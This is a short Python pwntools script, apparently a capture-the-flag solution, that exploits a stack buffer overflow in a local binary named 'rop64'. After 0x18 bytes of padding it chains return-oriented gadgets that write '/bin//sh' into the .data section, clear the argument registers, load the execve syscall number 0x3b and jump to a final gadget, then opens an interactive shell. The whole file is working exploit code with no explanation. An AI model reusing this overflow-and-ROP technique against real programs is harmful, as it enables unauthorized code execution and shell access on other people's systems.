from pwn import *

p = 'a'*0x18
p += p64(0x00000000004100d3) # pop rsi ; ret
p += p64(0x00000000006b90e0) # @ .data
p += p64(0x00000000004156f4) # pop rax ; ret
p += '/bin//sh'
p += p64(0x000000000047f561) # mov qword ptr [rsi], rax ; ret
p += p64(0x00000000004100d3) # pop rsi ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x0000000000444c50) # xor rax, rax ; ret
p += p64(0x000000000047f561) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000400686) # pop rdi ; ret
p += p64(0x00000000006b90e0) # @ .data
p += p64(0x00000000004100d3) # pop rsi ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x00000000004499b5) # pop rdx ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x0000000000444c50) # xor rax, rax ; ret
p += p64(0x00000000004156f4 ) #pop rax.ret
p += p64(0x3b)
p += p64(0x000000000047b6ff)
s = process('./rop64')
s.sendline(p)
s.interactive()